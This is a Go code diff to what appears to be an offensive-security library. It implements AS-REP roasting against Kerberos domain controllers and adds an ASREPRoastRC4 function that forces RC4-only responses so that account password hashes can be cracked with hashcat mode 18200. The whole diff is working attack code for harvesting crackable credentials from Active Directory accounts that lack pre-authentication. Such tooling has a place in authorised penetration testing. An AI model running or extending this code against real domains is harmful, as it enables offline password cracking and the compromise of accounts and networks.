@@ -31,6 +31,14 @@ type ASREPRoastResult struct {
 // list. It is separated from ASREPRoast so the request shape can be tested
 // without a KDC. realm is assumed already uppercased.
 func buildASREPRoastReq(username, realm string) (*messages.ASReq, error) {
+	return buildASREPRoastReqWithEtypes(username, realm, []int{
+		messages.ETypeAES256CTSHMACSHA196,
+		messages.ETypeAES128CTSHMACSHA196,
+		messages.ETypeRC4HMAC,
+	})
+}
+
+func buildASREPRoastReqWithEtypes(username, realm string, etypes []int) (*messages.ASReq, error) {
 	var nonce_buf [4]byte
 	if _, err := rand.Read(nonce_buf[:]); err != nil {
 		return nil, fmt.Errorf("asreproast: generate nonce: %w", err)
@@ -54,11 +62,7 @@ func buildASREPRoastReq(username, realm string) (*messages.ASReq, error) {
 			},
 			Till:  time.Now().UTC().Add(24 * time.Hour),
 			Nonce: nonce,
-			EType: []int{
-				messages.ETypeAES256CTSHMACSHA196,
-				messages.ETypeAES128CTSHMACSHA196,
-				messages.ETypeRC4HMAC,
-			},
+			EType: etypes,
 		},
 	}, nil
 }
@@ -70,9 +74,21 @@ func buildASREPRoastReq(username, realm string) (*messages.ASReq, error) {
 // KDC_ERR_PREAUTH_REQUIRED (25) and this function returns an error.
 // If the account does not exist the KDC responds with KDC_ERR_C_PRINCIPAL_UNKNOWN (6).
 func ASREPRoast(username, realm, kdcHost string) (*ASREPRoastResult, error) {
+	return asrepRoast(username, realm, kdcHost, buildASREPRoastReq)
+}
+
+// ASREPRoastRC4 requests an RC4-only AS-REP for hashcat mode 18200. A KDC
+// that has disabled RC4 for the target account will reject this request.
+func ASREPRoastRC4(username, realm, kdcHost string) (*ASREPRoastResult, error) {
+	return asrepRoast(username, realm, kdcHost, func(username, realm string) (*messages.ASReq, error) {
+		return buildASREPRoastReqWithEtypes(username, realm, []int{messages.ETypeRC4HMAC})
+	})
+}
+
+func asrepRoast(username, realm, kdcHost string, buildReq func(string, string) (*messages.ASReq, error)) (*ASREPRoastResult, error) {
 	realm = strings.ToUpper(realm)
 
-	req, err := buildASREPRoastReq(username, realm)
+	req, err := buildReq(username, realm)
 	if err != nil {
 		return nil, err
 	}
